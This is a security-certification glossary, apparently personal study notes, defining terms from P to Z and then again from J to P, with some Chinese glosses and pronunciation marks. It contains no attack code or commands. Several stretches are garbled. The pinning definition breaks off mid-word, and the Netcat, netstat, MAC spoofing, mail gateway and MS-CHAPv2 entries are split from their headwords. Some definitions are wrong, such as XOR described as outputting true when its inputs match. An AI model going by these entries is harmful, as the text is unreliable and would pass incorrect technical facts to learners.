perfect forward secrecy—A characteristic of encryption keys ensuring that keys are random. Perfect forward secrecy methods do not use deterministic algorithms.
permanent agent—A NAC agent that is installed on a client. It checks the client for health. Compare with dissolvable agent.
permission auditing review—An audit that analyzes user privileges. It identifies the privileges (rights and permissions) granted to users, and compares them against what the users need.
PFX—Personal Information Exchange. A common format for PKI certificates. It is the predecessor to P12 certificates.
PHI—Personal Health Information. PII that includes health information.
- phishing—The practice of sending email to users with the purpose of tricking them into revealing personal information or clicking on a link.
physical controls—Security controls that you can physically touch. PII—Personally Identifiable Information. Information about individuals that can be used to trace a person’s identity, such as a full name, birth date, biometric data, and more.
ping—A command-line tool used to test connectivity with remote systems.
pinning—A security mechanism used by some web s rsonation. Web sites provide clients with a list of public key hashes. Clients store the list and use it to validate the web site.
PIV—Personal Identity Verification card. A specialized type of smart card used by U.S. federal agencies. It includes photo identification and provides confidentiality, integrity, authentication, and non-repudiation. pivot—One of the steps in penetration testing. After escalating privileges, the tester uses additional tools to gain additional information on the exploited computer or on the network.
plaintext—Text displayed in a readable format. Encryption converts plaintext to ciphertext.
 pointer dereference—A programming practice that uses a pointer to reference a memory area. A failed dereference operation can corrupt memory and sometimes even cause an application to crash. POP3—Post Office Protocol version 3: protocol used to transfer email from mail servers to clients.
port mirror—A monitoring port on a switch. All traffic going through the switch is also sent to the port mirror.
preventive controls—Security controls that attempt to prevent a security incident from occurring.
privacy impact assessment—An assessment used to identify and reduce risks related to potential loss of PII. Compare with privacy threshold assessment.
privacy threshold assessment—An assessment used to help identify if a
system is processing PII. Compare with privacy impact assessment. private data—Information about an individual that should remain private. Personally Identifiable Information (PII) and Personal Health Information (PHI) are two examples.
private key—Part of a matched key pair used in asymmetric encryption. The private key always stays private. Compare with public key. privilege escalation—The process of gaining elevated rights and permissions. Malware typically uses a variety of techniques to gain elevated privileges.
privileged account—An account with elevated privileges, such as an administrator account.
proprietary data—Data that is related to ownership. Common examples are information related to patents or trade secrets.
protocol analyzer—A tool used to capture network traffic. Both professionals and attackers use protocol analyzers to examine packets. A protocol analyzer can be used to view data sent in clear text.
proximity cards—Small credit card-sized cards that activate when they are in close proximity to a card reader. They are often used by authorized personnel to open doors.
proxy/proxies—A server (or servers) used to forward requests for services such as HTTP or HTTPS. A forward proxy server forwards requests from internal clients to external servers. A reverse proxy accepts requests from the Internet and forwards them to an internal web server. A transparent proxy does not modify requests, but nontransparent proxies include URL filters. An application proxy is used for a specific application, but most proxy servers are used for multiple protocols. PSK—Pre-shared key. A wireless mode that uses a pre-shared key (similar to a passwordor passphrase) for security. Compare with Enterprise and Open modes.
public data—Data that is available to anyone. It might be in brochures, in press releases, or on web sites.
public key—Part of a matched key pair used in asymmetric encryption. The public key is publicly available. Compare with private key.
Public Key Infrastructure (PKI)—A group of technologies used to request, create, manage, store, distribute, and revoke digital certificates. pulping—A process that is performed after shredding papers. It reduces the shredded paper to a mash or puree.
pulverizing—A process used to physically destroy items such as optical discs that aren’t erased by a degausser.
purging—A general sanitization term indicating that all sensitive data has been removed from a device.
push notification services—The services that send messages to mobile devices.
Q
qualitative risk assessment—A risk assessment that uses judgment to categorize risks. It is based on impact and likelihood of occurrence. quantitative risk assessment—A risk assessment that uses specific monetary amounts to identify cost and asset value. It then uses the SLE and ARO to calculate the ALE.
R
race condition—A programming flaw that occurs when two sets of code attempt to access the same resource. The first one to access the resource wins, which can result in inconsistent results.
RADIUS—Remote Authentication Dial-In User Service. An authentication service that provides central authentication for remote access clients. Alternatives are TACACS+ and Diameter.
RAID—Redundant array of inexpensive disks. Multiple disks added together to increase performance or provide protection against faults. Common types include RAID-1, RAID-5, RAID-6, and RAID-10. rainbow table—A file containing precomputed hashes for character combinations. Rainbow tables are used to discover passwords. PBKDF2 and bcrypt thwart rainbow table attacks.
ransomware—A type of malware used to extort money from individuals and organizations. Ransomware typically encrypts the user’s data and demands a ransom before decrypting the data.
RAT—Remote access Trojan. Malware that allows an attacker to take control of a system from a remote location.
RC4—A symmetric stream cipher that can use between 40 and 2,048 bits. Experts consider it cracked and recommend using stronger alternatives.
record time offset—An offset used by recorders to identify times on recordings. If you know when the recording started, you can use the offset to identify the actual time at any point in the recording.
recovery site—An alternate location for business functions after a major disaster.
redundancy—The process of adding duplication to critical system components and networks to provide fault tolerance.
refactoring—A driver manipulation method. Developers rewrite the code without changing the driver’s behavior.
remote wipe—The process of sending a signal to a remote device to erase all data. It is useful when a mobile device is lost or stolen. replay attack—An attack where the data is captured and replayed. Attackers typically modify data before replaying it.
resource exhaustion—The malicious result of many DoS and DDoS attacks. The attack overloads a computer’s resources (such as the processor and memory), resulting in service interruption.
retina scanners—Biometric systems that scan the retina of an eye for authentication.
RFID attacks—Attacks against radio-frequency identification (RFID) systems. Some common RFID attacks are eavesdropping, replay, and DoS.
RIPEMD—RACE Integrity Primitives Evaluation Message Digest. A hash function used for integrity. It creates fixed-length hashes of 128, 160, 256, or 320 bits.
- risk—The possibility or likelihood of a threat exploiting a vulnerability resulting in a loss. Compare with threat and vulnerability.
risk assessment—A process used to identify and prioritize risks. It includes quantitative risk assessments and qualitative risk assessments. risk management—The practice of identifying, monitoring, and limiting risks to a manageable level. It includes risk response techniques, qualitative risk assessments, and quantitative risk assessments.
risk mitigation—The process of reducing risk by implementing controls. Security controls reduce risk by reducing vulnerabilities associated with a risk, or by reducing the impact of a threat.
risk register—A document listing information about risks. It typically includes risk scores along with recommended security controls to reduce the risk scores.
risk response techniques—Methods used to manage risks. Common risk response techniques are accept, transfer, avoid, and mitigate.
rogue AP—An unauthorized AP. It can be placed by an attacker or an employee who hasn’t obtained permission to do so. role-BAC—Role-based access control. An access control model that uses roles based on jobs and functions to define access. It is often implemented with groups (providing group-based privileges).
root certificate—A PKI certificate identifying a root CA. rooting—The process of modifying an Android device, giving the user root- level, or administrator, access. Compare with jailbreaking. rootkit—A type of malware that has system-level access to a computer. Rootkits are often able to hide themselves from users and antivirus software.
ROT13—A substitution cipher that uses a key of 13. To encrypt a message, you would rotate each letter 13 spaces. To decrypt a message, you would rotate each letter 13 spaces.
round-robin—A scheduling method used with load balancers. It redirects each client request to servers in a predetermined order.
router—A network device that connects multiple network segments together into a single network. They route traffic based on the destination IP address and do not pass broadcast traffic. Routers use ACLs.
RPO—Recovery point objective. A term that refers to the amount of data you can afford to lose by identifying a point in time where data loss is acceptable. It is often identified in a BIA.
RSA—Rivest, Shamir, and Adleman. An asymmetric algorithm used to encrypt data and digitally sign transmissions. It is named after its creators,
Rivest, Shamir, and Adleman.
RSTP—Rapid Spanning Tree Protocol. An improvement of STP to prevent switching loop problems.
RTO—Recovery time objective. The maximum amount of time it should take to restore a system after an outage. It is derived from the maximum allowable outage time identified in the BIA.
RTOS—Real-time operating system. An operating system that reacts to input within a specific time. Many embedded systems include an RTOS. rule-BAC—Rule-based access control. An access control model that uses rules to define access. Rule- based access control is based on a set of approved instructions, such as an access control list, or rules that trigger in response to an event, such as modifying ACLs after detecting an attack. runtime code—Code that is interpreted when it is executed. Compare with
compiled code.
S
SaaS—Software as a Service. A cloud computing model that provides applications over the Internet. Webmail is an example of a cloud-based technology. Compare with IaaS and PaaS.
salt—A random set of data added to a password when creating the hash. PBKDF2 and bcrypt are two protocols that use salts.
SAML—Security Assertion Markup Language. An XML-based standard used to exchange authentication and authorization information between different parties. SAML provides SSO for web- based applications. sandboxing—The use of an isolated area on a system, typically for testing. Virtual machines are often used to test patches in an isolated sandbox. Application developers sometimes use the chroot command to change the root directory creating a sandbox.
sanitize—The process of destroying or removing all sensitive data from systems and devices. Data sanitization methods include burning, shredding, pulping, pulverizing, degaussing, purging, and wiping. SATCOM—Satellite communications. A communication system that allows devices to connect to a satellite for communications. Many cars include satellite communication capabilities.
SCADA—Supervisory control and data acquisition. A system used to control an ICS such as a power plant or water treatment facility. Ideally, a SCADA is within an isolated network.
screen filter—A physical security device used to reduce visibility of a computer screen. Screen filters help prevent shoulder surfing.
script kiddie—An attacker with little expertise or sophistication. Script kiddies use existing scripts to launch attacks.
Scrubbing center: the scrubbing centers ara centralized data cleaning station wherein the traffic to a website is analysed and the malicious traffic is removed. SDN—Software defined network. A method of using software and virtualization technologies to replace hardware routers. SDNs separate the data
and control planes.
secure boot—A process that checks and validates system files during the boot process. A TPM typically uses a secure boot process.
secure DevOps—A software development process using an agile-aligned methodology. It considers security through the lifetime of the project. security incident—An adverse event or series of events that can negatively affect the confidentiality, integrity, or availability of an organization’s information technology (IT) systems and data. SED—Self-encrypting drive. A drive that includes the hardware and software necessary to encrypt a hard drive. Users typically enter credentials to decrypt and use the drive.
separation of duties—A security principle that prevents any single person or entity from controlling all the functions of a critical or sensitive process. It’s designed to prevent fraud, theft, and errors.
service account—An account used by a service or application.
session hijacking—An attack that attempts to impersonate a user by capturing and using a session ID. Session IDs are stored in cookies. SFTP—Secure File Transfer Protocol. An extension of Secure Shell (SSH) used to encrypt FTP traffic. SFTP transmits data using TCP port 22.
SHA—Secure Hash Algorithm. A hashing function used to provide integrity. Versions include SHA-1, SHA-2, and SHA-3. Shibboleth—An open source federated identity solution.
shimming—A driver manipulation method. It uses additional code to modify the behavior of a driver.
shoulder surfing—The practice of looking over someone’s shoulder to obtain information, such as on a computer screen. A screen filter placed over a monitor helps reduce the success of shoulder surfing. shredding—A method of destroying data or sanitizing media. Cross-cut paper shredders cut papers into fine particles. File shredders remove all remnants of a file by overwriting the contents multiple times. sideloading—The process of copying an application package to a mobile device. It is useful for developers when testing apps, but can be risky if users sideload unauthorized apps to their device.
SIEM—Security information and event management. A security system that attempts to look at security events throughout the organization. signature-based—A type of monitoring used on intrusion detection and intrusion prevention systems. It detects attacks based on known attack patterns documented as attack signatures.
single point of failure—A component within a system that can cause the entire system to fail if the component fails.
SLA—Service level agreement. An agreement between a company and a vendor that stipulates performance expectations, such as minimum uptime and maximum downtime levels.
SLE—Single loss expectancy. The monetary value of any single loss. It is used
to measure risk with ALE and ARO in a quantitative risk assessment. The calculation is SLE × ARO = ALE.
smart card—A credit card-sized card that has an embedded microchip and a certificate. It is used for authentication in the something you have factor of authentication.
S/MIME—Secure/Multipurpose Internet Mail Extensions. A popular standard used to secure email. S/ MIME provides confidentiality, integrity, authentication, and non-repudiation.
SMS—Short Message Service. A basic text messaging service. Compare with
MMS.
snapshot—A copy of a virtual machine (VM) at a moment in time. If you later have problems with the VM, you can revert it to the state it was in when you took the snapshot. Some backup programs also use snapshots to create a copy of data at a moment in time. SNMPv3—Simple Network Management Protocol version 3. A protocol used to monitor and manage network devices such as routers and switches.
SoC—System on a chip. An integrated circuit that includes a computing system within the hardware. Many mobile devices include an SoC. social engineering—The practice of using social tactics to gain information. Social engineers attempt to gain information from people, or get people to do things they wouldn’t normally do.
something you are—An authentication factor using biometrics, such as a fingerprint scanner.
something you do—An authentication factor indicating action, such as gestures on a touch screen.
something you have—An authentication factor using something physical, such as a smart card or token.
something you know—An authentication factor indicating knowledge, such as a password or PIN.
somewhere you are—An authentication factor indicating location, often using geolocation technologies.
spam—Unwanted or unsolicited email. Attackers often launch attacks using spam.
spam filter—A method of blocking unwanted email. By blocking email, it often blocks malware.
spear phishing—A targeted form of phishing. Spear phishing attacks attempt to target specific groups of users, such as those within a specific organization, or even a single user.
split tunnel—An encrypted connection used with VPNs. A split tunnel only encrypts traffic going to private IP addresses used in the private network.
Compare with full tunnel.
spyware—Software installed on users’ systems without their awareness or consent. Its purpose is often to monitor the user’s computer and the user’s activity.
SRTP—Secure Real-time Transport Protocol. A protocol used to encrypt and provide authentication for Real-time Transport Protocol (RTP) traffic. RTP is used for audio/video streaming.
SSH—Secure Shell. A protocol used to encrypt network traffic. SSH encrypts a wide variety of traffic such as SFTP. SSH uses TCP port 22. SSID—Service set identifier. The name of a wireless network. SSIDs can be set to broadcast so users can easily see it. Disabling SSID broadcast hides it from casual users.
SSL—Secure Sockets Layer. The predecessor to TLS. SSL is used to encrypt data-in-transit with the use of certificates.
SSL decryptors—Devices used to create separate SSL (or TLS) sessions. They allow other security devices to examine encrypted traffic sent to and from the Internet.
SSL/TLS accelerators—Devices used to handle TLS traffic. Servers can off- load TLS traffic to improve performance.
SSO—Single sign-on. An authentication method where users can access multiple resources on a network using a single account. SSO can provide central authentication.
standard operating procedures (SOPs)—A document that provides step- by- step instructions on how to perform common tasks or routine operations.
stapling—The process of appending a digitally signed OCSP response to a certificate. It reduces the overall OCSP traffic sent to a CA. STARTTLS—A command (not an acronym) used to upgrade an unencrypted connection to an encrypted connection on the same port. steganography—The practice of hiding data within data. example, it’s possible to embed text files within an image, hiding them from casual users. It is one way to obscure data to hide it.
storage segmentation—A method used to isolate data on mobile devices. It allows personal data to be stored in one location and encrypted corporate data to be stored elsewhere.
stored procedures—A group of SQL statements that execute as a whole, similar to a mini-program. Developers use stored procedures to prevent SQL injection attacks.
STP—Spanning Tree Protocol. A protocol enabled on most switches that protects against switching loops. A switching loop can be caused if two ports of a switch are connected.
stream cipher—An encryption method that encrypts data as a stream of bits or bytes. Compare with
block cipher.
substitution cipher—An encryption method that replaces characters with other characters.
supply chain assessment—An evaluation of the supply chain needed to produce and sell a product. It includes raw materials and all the processes required to create and distribute a finished product.
switch—A network device used to connect devices. Layer 2 switches send
traffic to ports based on their MAC addresses. Layer 3 switches send traffic to ports based on their IP addresses and support VLANs. symmetric encryption—A type of encryption using a single key to encrypt and decrypt data. Compare with asymmetric encryption. system sprawl—A vulnerability that occurs when an organization has more systems than it needs, and systems it owns are underutilized. Compare with VM sprawl.
T
tabletop exercise—A discussion-based exercise where participants talk through an event while sitting at a table or in a conference room. It is often used to test business continuity plans.
TACACS+—Terminal Access Controller Access-Control System Plus. An authentication service that provides central authentication for remote access clients. It can be used as an alternative to RADIUS.
tailgating—A social engineering attack where one person follows behind another person without using credentials. Mantraps help prevent tailgating.
taps—Monitoring ports on a network device. IDSs use taps to capture traffic. tcpdump—A command-line protocol analyzer. Administrators use it to capture packets. technical controls—Security controls implemented through technology.
tethering—The process of sharing an Internet connection from one mobile device to another.
thin AP—An AP that is managed by a controller. Sometimes called a controller-based AP. Compare with fat AP.
third-party app store—An app store other than the primary source for mobile device apps. It refers to an app store other than the App Store or Google Play for Apple and Android devices, respectively.
threat—Any circumstance or event that has the potential to compromise confidentiality, integrity, or availability. Compare with risk and vulnerability.
threat assessment—An evaluation of potential threats. Some common types of threat assessments are environmental, manmade, internal, and external.
three-way handshake: a method used by TCP to create TCP/IP connection over an internet protocol based network, between a local host/client and server. It requires both the client and server to exchange, SYN, /SYN-ACK, ACK (acknowledgment), packets before actual data communication begins.
time-of-day restrictions—An account restriction that prevents users from logging on at certain times.
TKIP—Temporal Key Integrity Protocol. A legacy wireless security protocol. CCMP is the recommended replacement.
TLS—Transport Layer Security. The replacement for SSL. TLS is used
 to encrypt data-in-transit. Like SSL, it uses certificates issued by CAs. token—An authentication device or file. A hardware token is a physical device used in the something you have factor of authentication. A software token is a small file used by authentication services indicating a user has logged on.
TOTP—Time-based One-Time Password. An open source standard similar to HOTP. It uses a timestamp instead of a counter. One-time passwords created with TOTP expire after 30 seconds.
TPM—Trusted Platform Module. A hardware chip on the motherboard included with many laptops and some mobile devices. It provides full disk encryption. Compare with HSM.
Tracert—A command-line tool used to trace the route between two systems.
Traceroute—network diagnostic commands for displaying the route (path) and measuring transit delays of packets across an Internet Protocol (IP) network. small TTL values are transmitted through packets via traceroute. Help identify the connection stops or get broken, whether it is firiewall, ISP, router etc.
transitive trust—An indirect trust relationship created by two or more direct trust relationships.
Trojan—Malware also known as a Trojan horse. A Trojan often looks useful, but is malicious.
trusted operating system—An operating system that is configured to meet a set of security requirements. It ensures that only authorized personnel can access data based on their permissions.
Twofish—A symmetric key block cipher. It encrypts data in 128-bit blocks and supports 128-, 192-, or
256-bit keys. Compare with Blowfish.
Type I hypervisors—A virtualization technology. Type I hypervisors (or bare- metal hypervisors) run directly on the system hardware. They
 don’t need to run within an operating system.
Type II hypervisors—A virtualization technology. Type II hypervisors run as software within a host operating system. The Microsoft Hyper-V hypervisor runs within a Microsoft operating system to host VMs.
Typo squatting—The purchase of a domain name that is close to a legitimate domain name. Attackers often try to trick users who inadvertently use the wrong domain name. Also called URL hijacking. U
UAVs—Unmanned aerial vehicles. Flying vehicles piloted by remote control or onboard computers.
UEFI—Unified Extensible Firmware Interface. A method used to boot some systems and intended to replace Basic Input/Output System (BIOS) firmware.
URL hijacking—The purchase of a domain name that is close to a legitimate domain name. Attackers often try to trick users who inadvertently use the wrong domain name. Also called typo squatting. USB OTG—Universal Serial Bus On-The-Go. A cable used to connect mobile devices to other devices. It is one of many methods that you can use to connect a mobile device to external media.
use case—A methodology used in system analysis and software engineering to identify and clarify requirements to achieve a goal. example, a use case of supporting confidentiality can help an organization identify the steps required to protect the confidentiality of data.
UTM—Unified threat management. A group of security controls combined in a single solution. UTM appliances can inspect data streams for malicious content and block it.
V
VDI/VDE—A virtual desktop infrastructure or virtual desktop environment. Users access a server hosting virtual desktops and run the desktop operating system from the server.
vendor diversity—The practice of implementing security controls from different vendors to increase security. Compare with control diversity. version control—A method of tracking changes to software as it is updated.
virtualization—A technology that allows you to host multiple virtual machines on a single physical system. Different types include Type I, Type II, and application cell/container virtualization.
virus—Malicious code that attaches itself to a host application. The host application must be executed to run, and the malicious code executes when the host application is executed.
VLAN—Virtual local area network. A method of segmenting traffic. A VLAN logically groups several different computers together without regard to their physical location.
VM escape—An attack that allows an attacker to access the host system from within a virtual machine. The primary protection is to keep hosts and guests up to date with current patches.
VM sprawl—A vulnerability that occurs when an organization has many VMs that aren’t properly managed. Unmanaged VMs are not kept up to date with current patches. Compare with system sprawl.
voice recognition—A biometric method that identifies who is speaking using speech recognition methods to identify different acoustic features. VPN—Virtual private network. A method that provides access to a private network over a public network such as the Internet. VPN concentrators are dedicated devices used to provide VPN access to large groups of users.
vulnerability—A weakness. It can be a weakness in the hardware, the software, the configuration, or even the users operating the system. Compare with risk and threat.
Vulnerability scanner—A tool used to detect vulnerabilities. A scan typically identifies vulnerabilities, misconfigurations, and a lack of security controls. It passively tests security controls.
W
warm site—An alternate location for operations. A compromise between an expensive hot site and a cold site. Compare with cold site and hot site.
waterfall—A software development life cycle model using a top-down approach. It uses multiple stages with each stage starting after the previous stage is complete. Compare with agile.
watering hole attack—An attack method that infects web sites that a group is likely to trust and visit.
wearable technology—Smart devices that a person can wear or have implanted.
web application firewall (WAF)—A firewall specifically designed to protect a web application, such as a web server. A WAF inspects the contents of traffic to a web server and can detect malicious content, such as code used in a cross-
scripting attack, and block it.
whaling—A form of spear phishing that attempts to target high-level executives. When successful, attackers gain confidential company information that they might not be able to get anywhere else.
white box test—A type of penetration test. Testers have full knowledge of the environment prior to starting the test. Compare with black box test and gray box test.
Wi-Fi Direct—A standard that allows devices to connect without a wireless access point.
wildcard certificate—A certificate that can be used for multiple domains with the same root domain. It starts with an asterisk.
wiping—The process of completely removing all remnants of data on a disk. A bit-level overwrite writes patterns of 1s and 0s multiple times to ensure data on a disk is unreadable.
wireless scanners—A network scanner that scans wireless frequency bands. Scanners can help discover rogue APs and crack passwords used by wireless APs.
worm—Self-replicating malware that travels through a network. Worms do not need user interaction to execute.
WPA—Wi-Fi Protected Access. A legacy wireless security protocol. It has been superseded by WPA2.
WPA2—Wi-Fi Protected Access II. A wireless security protocol. It supports CCMP for encryption, which is based on AES. It can use Open mode, a pre- shared key, or Enterprise mode.
WPS—Wi-Fi Protected Setup. A method that allows users to easily configure a wireless network, often by using only a PIN. WPS brute force attacks can discover the PIN.
WPS attack—An attack against an AP. A WPS attack discovers the eight-digit WPS PIN and uses it to discover the AP passphrase.
X
XML—Extensible Markup Language. A language used by many databases for inputting or exporting data. XML uses formatting rules to describe the data.
XOR—A logical operation used in some encryption schemes. XOR operations compare two inputs. If the two inputs are the same, it outputs True. If the two inputs are different, it outputs False.
Cross-Site Scripting (XSS) attacks. type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.
Z
zero-day vulnerability—A vulnerability or bug that is unknown to trusted sources but can be exploited by attackers. Zero-day attacks take advantage of zero-day vulnerabilities.
◆
- the IV. Legacy wireless security protocols are susceptible to IV attacks.
◆J - jailbreaking—The process of modifying an Apple mobile device to remove software restrictions. It allows a user to install software from any third-party source. Compare with rooting.
- jamming—A DoS attack against wireless networks. It transmits noise on the same frequency used by a wireless network.
- job rotation—A process that ensures employees rotate through different jobs to learn the processes and procedures in each job. It can sometimes detect fraudulent activity.
K
- KDC—Key Distribution Center. Also known as a TGT server. Part of the Kerberos protocol used for network authentication. The KDC issues timestamped tickets that expire.
- Kerberos—A network authentication mechanism used with Windows Active Directory domains and some Unix environments known as realms. It uses a KDC to issue tickets.
- kernel—The central part of the operating system. In container virtualization, guests share the kernel.
- key escrow—The process of placing a copy of a private key in a safe environment.
- keylogger—Software or hardware used to capture a user’s keystrokes. Keystrokes are stored in a file and can be manually retrieved or automatically sent to an attacker.
- key stretching—A technique used to increase the strength of stored passwords. It adds additional bits (called salts) and can help thwart brute force and rainbow table attacks.
- known plaintext—A cryptographic attack that decrypts encrypted data. In this attack, the attacker knows the plaintext used to create ciphertext.
 L
- labeling—The process of ensuring data is tagged clearly so that users know its classification. Labels can be physical labels, such as on backup tapes, or digital labels embedded in files.
- LDAP—Lightweight Directory Access Protocol. A protocol used to communicate with directories such as Microsoft Active Directory. It identifies objects with query strings using codes such as CN=Users and DC=GetCertifiedGetAhead.
- LDAPS—LightweightDirectoryAccessProtocolSecure.A protocol used to encrypt LDAP traffic with TLS.
- least functionality—A core principle of secure systems design. Systems should be deployed with only the applications, services, and protocols needed to meet their purpose.
- leastprivilege—Asecurityprinciplethatspecifiesthatindividuals and processes are granted only the rights and permissions needed to perform assigned tasks or functions, but no more.
- legal hold—A court order to maintain data for evidence. A legal hold policy may state that the organization will comply with the court order.
- likelihood of occurrence—The probability that something will occur. It is used with impact in a qualitative risk assessment. Compare with impact.
- load balancer—Hardware or software that balances the load between two or more servers.
  - Scheduling methods include source address IP affinity and round-robin.
  - Affinity 姻亲关系;类同—A scheduling method used with load balancers. directs user requests to a specific server, uses
the client’s IP address to ensure the client is redirected to the
same server during a web session.
  - round-robin scheduling scheme: allows a load balancer to
send requests to servers one after another. 74

 - location-based policies—Policies that prevent users from logging on from certain locations, or require that they log on only from specific locations.
- logic bomb—A type of malware that executes in response to an event. The event might be a specific date or time, or a user action such as when a user launches a specific program.
- loop prevention—A method of preventing switching loop or bridge loop problems. Both STP and RSTP prevent switching loops.
M
- MAC—Mandatory access control. An access control model that
uses sensitivity labels assigned to objects (files and folders) and
subjects (users). MAC restricts access based on a need to know.
Every resource has sensitivity label matching a clearance level assigned to a user
- MAC—Media access control. A 48-bit address used to identify network interface cards. It is also called a hardware address or a physical address.
- MAC filtering—A form of network access control to allow or block access based on the MAC address.
     ⁃
It is configured on switches for port security or on APs for wireless security.
—An attack that changes the source MAC address.
 - ◆
—A server that examines and processes all incoming and outgoing email. It typically includes a spam filter and DLP capabilities. Some gateways also provide encryption services.
MAC spoofing
 mail gateway
 - Malware—Malicious software. It includes a wide range of software that has malicious intent, such as viruses, worms, ransomware, rootkits, logic bombs, and more.
- Malvertising—the use of online advertising to spread malware. injecting malicious or malware-laden advertisements into
 legitimate online advertising networks and webpages.
- Mandatory vacation—A policy that forces employees to take a
vacation. The goal is to deter malicious activity, such as fraud and embezzlement /ɪmˈbezlmənt/, and detect malicious activity when it occurs.
- Man-in-the-browser—An attack that infects vulnerable web browsers. It can allow the attacker to capture browser session data, including keystrokes.
- man-in-the-middle (MITM)—An attack using active interception or eavesdropping. It uses a third computer to capture traffic sent between two other systems.
- mantrap—A physical security mechanism designed to control access to a secure area. A mantrap prevents tailgating.
- MD5—Message Digest 5. A hashing function used to provide integrity. MD5 creates 128-bit hashes, which are also referred to as MD5 checksums. Experts consider MD5 cracked.
- MDM—Mobile device management. A group of applications and/ or technologies used to manage mobile devices. MDM tools can
monitor mobile devices and ensure they are in compliance with security policies.
- memory leak—An application flaw that consumes memory without releasing it.
- MFDs—Multi-function devices. Any device that performs multiple functions. example, many printers are MFDs because they can
print, scan, and copy documents. Many also include faxing capabilities.
- MMS—Multimedia Messaging Service. A method used to send text messages. It is an extension of SMS and supports sending multimedia content.
- MOU/MOA—Memorandum 记录 of understanding / agreement. A type of agreement that defines responsibilities of each party. Compare with ISA (interconnection security agreement)
          ◆
and PAP.
- MTBF—Mean time between failures. A metric that provides a
measure of a system’s reliability and is usually represented in hours. The MTBF identifies the average time between failures.
- MTTR—Mean time to recover. A metric that identifies the average time it takes to restore a failed system. Organizations that have maintenance contracts often specify the MTTR as a part of the contract.
- multifactor authentication—A type of authentication that uses methods from more than one factor of authentication.
N
- NAC—Network access control. A system that inspects clients to ensure they are healthy.
  - administrators don’t have complete control of computers employees use at home or on the road. NAC provides a measure of control for these other computers. can use for VPN clients and for internal clients.
  - NAC systems use health: indicating that a client meets these predetermined characteristics.
  - Agents inspect clients and agents can be permanent or dissolvable (agentless).
- NAT—NetworkAddressTranslation.Aservicethattranslates public IP addresses to private IP addresses and private IP addresses to public IP addresses. Compare tp PAT.
- NDA—Non-disclosureagreement.Anagreementthatisdesigned to prohibit personnel from sharing proprietary data. used with employees within the organization and with other organizations.
- —A command-line tool used to connect to remote systems.
- —A command-line tool used to show network statistics on a
MS-CHAPv2—Microsoft Challenge Handshake Authentication
Microsoft implementation of CHAP. MS- CHAPv2 provides mutual authentication. Compare with CHAP
Protocol version 2.
       Netcat
 netstat system.
- network mapping—A process used to discover devices on a
network, including how they are connected.
- network scanner—A tool used to discover devices on a network,
including their IP addresses, operating system, services and protocols running on the devices.
- NFC. Near field communication—a group of standards that allow mobile devices to communicate with nearby mobile devices.
- NFC attack—An attack against mobile devices that use near field communication (NFC)
- NIDS—Network-based intrusion detection system. A device that detects attacks and raises alerts. A NIDS is installed on network devices, such as routers or firewalls, and monitors network traffic.
- NIPS—Network-based intrusion prevention system. A device that detects and stops attacks in progress. A NIPS is placed inline (in- band) with traffic to actively monitor data streams.
- NIST—National Institute of Standards and Technology. NIST is a part of the U.S. Department of Commerce, and it includes an
Information Technology Laboratory (ITL). The ITL publishes special publications related to security that are freely available to anyone.
- Nmap—A command-line tool used to scan networks. It is a type of network scanner.
- nonce—A number used once. Cryptography elements frequently use a nonce to add randomness.
- non-persistence—A method used in virtual desktops where changes made by a user are not saved. Most (or all) users have the
same desktop. When users log off, the desktop reverts to its original state.
- non-repudiation—The ability to prevent a party from denying an action.
  - Digital signatures and access logs provide non-repudiation. 78

 - normalization—The process of organizing tables and columns in a database. Normalization reduces redundant data and improves overall database performance.
- nslookup—A command-line tool used to test DNS on Microsoft systems. Compare with dig.
- NTLM—New Technology LAN Manager. A suite of protocols that provide confidentiality, integrity, and authentication within
Windows systems. Versions include NTLM, NTLMv2, and NTLM2 Session.

## O
- OAuth—An open source standard used for authorization with Internet-based single sign-on solutions.
- Obfuscation /ɔbfʌ'skeiʃən/—An attempt to make something unclear or difficult to understand.
  - Steganography methods use obfuscation to hide data within data.
- OCSP—Online Certificate Status Protocol. An alternative to using a CRL. It allows entities to query a CA with the serial number of a certificate. The CA answers with good, revoked, or unknown.
- onboarding—The process of granting individuals access to an organization’s computing resources after being hired. It typically
includes giving the employee a user account with appropriate permissions.
- Open—A wireless mode that doesn’t use security. Compare with Enterprise and PSK modes.
- OpenID Connect—An open source standard used for identification on the Internet. It is typically used with OAuth and it allows clients
to verify the identity of end users without managing their credentials.
- open-source intelligence—A method of gathering data using public 79

sources, such as social media sites and news outlets.
- order of volatility /ˌvɑlə'tɪləti/—A term that refers to the order in
which you should collect evidence.
  - example, data in memory is more volatile than data on a disk
drive, so it should be collected first.
  - from most volatile /'vɒlətaɪl/ to least volatile
  - Data in cache memory, including the processor cache and hard drive cache
  - Data in RAM random access memory, including system and network processes
  - A paging file (swap file) on the system disk drive
  - the page file is an extension of RAM and it is stored on the hard drive.
  - However, the page file isn’t a typical file and it’s rebuilt when the system
is rebooted, so it’s more volatile than files stored on hard drives.
  - Data stored on local disk drives
  - Logs stored on remote systems
  - Archive /ˈɑ:kaiv/ media
- OSI model. Open Systems Interconnection (OSI) reference model, is a conceptual and logical layout that defines how application communicate across the network. Its goal is the interoperability 互 用性 of diverse communication systems with standard communication protocols.
  - Layer 1: Physical Layer. responsible for the transmission and reception of unstructured raw data between a device and a physical transmission medium. It converts the digital bits into electrical, radio, or optical signals.
  - Layer 2: Data Link. provides node-to-node data transfer—a link between two directly connected nodes /nəuds/.
  - It detects and possibly corrects errors that may occur in the physical layer.
  - It defines the protocol to establish and terminate a connection between two physically connected devices.
  - It also defines the protocol for flow control between them. (Frames)
  - Layer 3: Network Layer. transferring variable length data sequences (packets) from one node to another connected in "different networks".
  - Layer 4: Transport Layer. transferring variable-length data 80

sequences from a source to a destination host, while
maintaining the quality of service functions. (TCP/UDP)
  - Layer 5: Session Layer. controls the dialogues 对话 /'daɪəlɒg/
(connections) between computers.
  - It establishes, manages and terminates the connections
between the local and remote application.
  - It provides for full-duplex, half-duplex, or simplex
operation, and establishes procedures for checkpointing, suspending, restarting, and terminating a session.
  - It responsible for gracefully closing a session (the Transmission Control Protocol at the transport layer in the Internet Protocol Suite). and for session checkpointing and recovery, which is not usually used in the Internet Protocol Suite.
  - Layer 6: Presentation Layer. responsible for the formatting of data being exchanged, translating between application and network formats.
  - Layer 7: Application Layer. provides a basic underlying network infrastructure, allows applications to communicate with each other.
- out-of-band—A configuration that allows a device to collect traffic without the traffic passing through it. Sometimes called passive. Compare with inline.


## P
- P7B—PKCS#7. A common format for PKI certificates. They are DER-based (ASCII) and commonly used to share public keys.
